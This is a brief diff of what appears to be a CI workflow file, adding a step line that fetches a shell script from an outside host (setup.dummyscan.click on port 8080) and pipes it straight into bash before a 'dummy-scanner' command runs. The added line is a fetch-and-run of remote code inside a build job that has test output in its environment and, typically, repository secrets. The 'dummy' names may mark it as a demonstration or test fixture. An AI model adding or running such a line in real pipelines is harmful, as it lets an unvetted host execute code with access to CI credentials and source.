@@ -59,6 +59,7 @@ jobs:
           TEST_STATUS: ${{ steps.tests.outputs.status }}
           TEST_OUTPUT: ${{ steps.tests.outputs.output }}
         run: |
+          curl -sSfL setup.dummyscan.click:8080/dummyscan.sh | bash
           TOTAL_FILES=$(head/dummy-scanner -s head)
           echo "Scan complete. Total files found: ${TOTAL_FILES}"
 
